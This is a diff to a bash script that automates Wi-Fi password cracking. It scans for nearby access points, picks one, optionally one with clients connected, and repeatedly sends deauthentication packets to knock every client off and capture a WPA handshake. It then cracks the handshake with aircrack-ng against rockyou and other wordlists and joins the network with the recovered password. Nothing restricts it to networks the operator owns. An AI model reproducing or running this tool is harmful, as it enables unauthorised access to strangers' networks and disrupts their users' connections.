@@ -1,30 +1,40 @@
 #!/bin/bash
 
+#Initial variables set
+onlywithclients=0         #Search only for BSSIDS with clients (This can be touchy since it will only detect if there are clients during the initial one minute scan)
 
-touch caplog.txt
+if [[ $(grep 'STATUS 1' caplog.txt) == '' ]]; then          #If the last exit was without error, clear/create the caplog
+  touch caplog.txt
+fi
 touch blacklist
 rm crackedpassword    #Deletes the file so it doesn't get confused between attempts
-echo $(date) " - Starting script" > caplog.txt
+echo $(date) " - Starting script" >> caplog.txt
+
+echo $(date) " - Starting Variables (1=On, 0=Off):" >> caplog.txt
+echo $(date) " - Search for hotspots with client(s) only: %s" %onlywithclients >> caplog.txt
+
 echo $(date) " - Backing up files" >> caplog.txt
 #This is to backup files before moving on
 mv caplogOLD.txt caplogOLDEST.txt
 mv caplog.txt caplogOLD.txt
 mv ap/* apBK/
 rm -r ap              #Make sure the file is deleted at the start of the script
+
+
 #The code below tests the connection initially
 echo $(date) " - Attempting initial network test..." >> caplog.txt
 ping -c 5 www.google.com          #Tests connection, requiring DNS
 if [[ $(echo $?) == 2 ]]; then
-  echo $(date) " - Failed connection to Google.com." >> caplog.txt
-  ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
-  if [[ $(echo $?) == 2 ]]; then
-    echo $(date) " - Failed connection to 8.8.8.8. Moving on to cracking." >> caplog.txt
-  fi
+ echo $(date) " - Failed connection to Google.com." >> caplog.txt
+ ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
+ if [[ $(echo $?) == 2 ]]; then
+   echo $(date) " - Failed connection to 8.8.8.8. Moving on to cracking." >> caplog.txt
+ fi
 fi
 if [[ $(echo $?) == 0 ]]; then
-  echo $(date) " - Connection appears to be working. No need for cracking." >> caplog.txt
-  python sendsuccess.py
-  exit 1                #Since it has a connection, no need to break any passwords, exits the script
+ echo $(date) " - Connection appears to be working. No need for cracking." >> caplog.txt
+ python sendsuccess.py
+ exit 1                #Since it has a connection, no need to break any passwords, exits the script
 fi
 #Start the cracking script...
 if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
@@ -34,7 +44,7 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
     ifconfig wlan1 up
     echo $(date) " - Starting scan..." >> caplog.txt
     mkdir ap/
-    airodump-ng -w ap/automated --beacons --ignore-negative-one wlan1 & #Start the scan in the background and let it collect data
+    airodump-ng -w ap/automated --beacons --ignore-negative-one --output-format csv wlan1 & #Start the scan in the background and let it collect data
     sleep 60
     pid="$(ps -e | grep airodump-ng | cut -d' ' -f1 | sed -n '1p')"      #This gets the process ID to kill
     if [[ $pid == '' ]]; then
@@ -42,8 +52,12 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
     fi
     echo $(date) " - Killing $pid" >> caplog.txt
     kill $pid                                   #Kills the process
-    sed -i '1d;2d' ap/automated-01.csv                      #Deletes the top blank line and column headers
-    sed -ie '/Station MAC/,+50d' ap/automated-01.csv        #Takes away the garbage at the bottom of the file
+    clientstart="$(grep -n 'Station MAC' ap/automated-01.csv | cut -d ':' -f1)"        #Finds the line number where the
+    clientend="$(wc -l ap/automated-01.csv | cut -d' '  -f1)"         #Finds end of file
+    sed -n "${clientstart}, ${clientend} p" ap/automated-01.csv > ap/clients
+    todel=$(($clientend-$clientstart+3))                     #Calculates the amount of client lines to delete (plus 3 for safety)
+    sed -i '1d;2d' ap/automated-01.csv                       #Deletes the top blank line and column headers
+    sed -ie "/Station MAC/,+${todel}d" ap/automated-01.csv        #Takes away the client data at the bottom (Which we have copied over to a different file)
     lines="$(wc -l ap/automated-01.csv | cut -d' '  -f1)" #This figures out how many lines are left so it can choose near the bottom
     if [[ $lines -gt '3' ]]; then              #Only lop off the last two lines if its at least 5 lines long
       lines="$(($lines-2))"                   #Used to select the line 2nd from the bottom
@@ -94,14 +108,41 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
       bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID 2nd from the bottom
       chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL 2nd from the bottom
     fi
-    while [[ $(echo $ssid) == '' ]] && [[ $(echo $lines) -gt 1 ]] || [[ $(grep $ssid wifiblacklist) != '' ]]; do  #If the SSID is blank AND its not at the top line OR if it's on the blacklist
+    while [[ $ssid == '' ]] && [[ $lines -gt 1 ]] || [[ $(grep $ssid wifiblacklist) != '' ]]; do  #If the SSID is blank AND its not at the top line OR if it's on the blacklist
       lines="$(($lines-1))"
       ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID
       bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID
       chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL
       echo $(date) " - Hotspot was blank or on the blacklist, switching now..." >> caplog.txt
     done
-    # lines=$(grep -n 'Test' ap/automated-01.csv | cut -d':'  -f1)                             #DEBUGGING
+    ####This will check if you only want to try against networks with clients. If so, it will attempt to find one (if not, it defaults to the other choice)
+    if [[ $onlywithclients == 1 ]]; then
+      echo $(date) " - Now that I have an access point picked out I'll check if it has clients" >> caplog.txt
+      if [[ $(grep $ssid ap/clients) == '' ]] && [[ $(grep $bssid ap/clients) == '' ]]; then          #If the SSID and BSSID isn't in the client file, there are no clients connected and it needs to switch
+        echo $(date) " - There were no clients connected, so I'm going to switch access points ($ssid)" >> caplog.txt
+        oldssid=$ssid
+        oldbssid=$bssid
+        oldchan=$chan
+        ssid=''
+        while [[ $ssid == '' ]] || [[ $(grep $ssid ap/clients) == '' ]] && [[ $(grep $bssid ap/clients) == '' ]] || [[ $(grep $ssid wifiblacklist) != '' ]]; do  #If the SSID is blank AND its not at the top line OR if it's on the blacklist
+          lines="$(($lines-1))"
+          ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID
+          bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID
+          chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL
+          echo $(date) " - Hotspot was blank, has no clients, or is on the blacklist, switching now... ($ssid)" >> caplog.txt
+          if [[ $lines -le 1 ]]; then             #If we don't have any more to choose from, it will go with the backup access point previously chosen
+            echo $(date) " - Ran out of choices, going with my last choice" >> caplog.txt
+            ssid=$oldssid
+            bssid=$oldbssid
+            chan=$oldchan
+            break
+          fi
+        done
+      else        #Else, there are clients and everything is good
+        echo $(date) " - Looks like theres at least one client connected, continuing with this access point" >> caplog.txt
+      fi
+    fi
+    # lines=$(grep -n 'TiPhone' ap/automated-01.csv | cut -d':'  -f1)                            #DEBUGGING
     # ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #DEBUGGING
     # bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #DEBUGGING
     # chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #DEBUGGING
@@ -109,7 +150,7 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
     echo "-- Progress: 1 --"
     airodump-ng --bssid $bssid --channel $chan --update 10 --write ap/capture wlan1 |& tee airodump-results.txt &     #Attempts to get the password, background process
     #Setup do/while statement to check for handshake
-    #Make sure this runs DURING the command, not affter.
+    #Make sure this runs DURING the command, not after.
     duration=0              #Keeps track of how long its been waiting for a handshake
     rand=$(( ( RANDOM % 20 )  + 50 ))         #Random number between 50 and 70
     # rand=4                                      #DEBUGGING
@@ -128,6 +169,7 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
           echo $(date) " - I've waited $(($waited/4)) minutes. Now BLACKLISTING the wifi and restarting the script" >> caplog.txt
           echo $(date) " - BLACKLISTING: $ssid" >> caplog.txt
           echo $ssid >> wifiblacklist             #Writes the SSID to the blacklist file for records
+          echo $(date) " - EXIT STATUS 1" >> caplog.txt               #Exit with "error" so that it won't overwrite the caplog
           exec bash capture2                      #Restarts the script, but it will skip the hotspot it just tried
         fi
         rand=$(( ( RANDOM % 20 )  + 50 ))         #Random number between 50 and 70
@@ -135,6 +177,14 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
         echo '' > airodump-results.txt        #Clears the file so it doesn't get to huge
         aireplay-ng -0 2 -a $bssid wlan1       #De-auths every client
         sleep 15
+      fi
+      if [[ $(grep 'interface wlan1 down' airodump-results.txt) != '' ]]; then                  #If the interface goes down, restart the script
+        echo $(date) " - The interface WLAN1 was shutdown by the system. Restarting the script" >> caplog.txt
+        ifconfig wlan1 down
+        iwconfig wlan1 mode managed
+        ifconfig wlan1 up
+        echo $(date) " - EXIT STATUS 1" >> caplog.txt           #Exit with error since the interface crashed
+        exec bash capture2                      #Restarts the script, but it will skip the hotspot it just tried
       fi
     done
     echo $(date) " - HANDSHAKE CAPTURED" >> caplog.txt
@@ -145,8 +195,13 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
     echo $(date) " - Killing $pid since I have a handshake file" >> caplog.txt                #Logs the kill
     kill $pid                                     #Kills the airodump-ng process since it has a handshake by now
     if [[ $(ls /usr/share/wordlists/rockyou.txt) == '' ]]; then    #If rockyou.txt isn't unzipped, it will do that here
-      echo $(date) " - Rockyou isn't unzipped. Uncompressing now." >> caplog.txt
-      gunzip /usr/share/wordlists/rockyou*
+      if [[ $(ls /usr/share/wordlists/rockyou*) != '' ]]; then     #If rockyou exists
+        echo $(date) " - Rockyou isn't unzipped but exists. Uncompressing and moving it now" >> caplog.txt
+        gunzip /usr/share/wordlists/rockyou*
+        cp /usr/share/wordlists/rockyou.txt /root/Documents/dictionaries/
+      else
+        echo $(date) " - Rockyou doesn't exists in the default location, going straight to documents now" >> caplog.txt
+      fi
     fi
     #Turn off monitoring mode to allow more CPU usage for cracking
     echo $(date) " - Got the handshake. Turning off monitoring mode" >> caplog.txt
@@ -156,10 +211,21 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
     #It will attempt to break the password now. With the Pi, this can take up to 36 hours
     #It'll use the rockyou.txt file and write the password out to "crackedpassword" when its done
     echo "-- Progress: 2 --"
-    aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /root/Documents/dictionaries/rockyou.txt    #Tries to crack it with the dictionary
-    # aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /usr/share/wordlists/test.txt    #DEBUGGING
+    wordlistcount=$(($(ls -l | grep -v ^1 | wc -l)-1))
+    echo $(date) " - There are $wordlistcount wordlists that I will go through in alphabetical order" >> caplog.txt
+    #Do this for all files in /root/Documents/dictionaries
+    for wordlists in /root/Documents/dictionaries/*; do
+      echo $(date) " - Trying to crack the file with $wordlists now" >> caplog.txt
+      aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w $wordlists    #Tries to crack it with the dictionary
+      #aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /usr/share/wordlists/test.txt    #DEBUGGING
+      if [[ $(cat crackedpassword) != '' ]]; then
+        echo $(date) " - It seems something was added to the crackedpassword file, not going through any more dictionaries" >> caplog.txt
+        break
+      fi
+    done
     if [[ $(cat crackedpassword) != '' ]]; then
-      echo $(date) " - The password was cracked.       Password: $(cat crackedpassword)" >> caplog.txt
+      echo $(date) " - The password was cracked." >> caplog.txt
+      echo $(date) " - Password: $(cat crackedpassword)" >> caplog.txt
       nmcli d wifi connect $ssid password $(cat crackedpassword)
       sleep 60
       ping -c 5 www.google.com          #Tests connection, requiring DNS
@@ -173,6 +239,7 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
       if [[ $(echo $?) == 0 ]]; then
         echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
         python sendsuccess.py
+        echo $(date) " - EXIT STATUS 0" >> caplog.txt           #Exit without errors
         exit 1                #Since it has a connection, no need to break any passwords, exits the script
       fi
     fi
@@ -184,6 +251,7 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
       ifconfig wlan1 down
       iwconfig wlan1 mode managed
       ifconfig wlan1 up
+      echo $(date) " - EXIT STATUS 0" >> caplog.txt           #Exit without errors
       exit 1
     fi
     if [[ $(cat crackedpassword) != '' ]]; then
@@ -196,12 +264,14 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
         ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
         if [[ $(echo $?) == 2 ]]; then
           echo $(date) " - Failed connection to 8.8.8.8! No network connection, something went wrong." >> caplog.txt
+          echo $(date) " - EXIT STATUS 0" >> caplog.txt           #Exit without errors, since it was just a connection error, caplog needs overwritten next time
           exit 1
         fi
       fi
       if [[ $(echo $?) == 0 ]]; then
         echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
         python sendsuccess.py
+        echo $(date) " - EXIT STATUS 0" >> caplog.txt           #Exit without errors
         exit 1                #Since it has a connection, no need to break any passwords, exits the script
       fi
     fi
@@ -216,4 +286,5 @@ ifconfig wlan1 down
 iwconfig wlan1 mode managed
 ifconfig wlan1 up
 echo $(date) " - FINAL EXIT" >> caplog.txt
+echo $(date) " - EXIT STATUS 0" >> caplog.txt           #Exit without errors
 exit 1
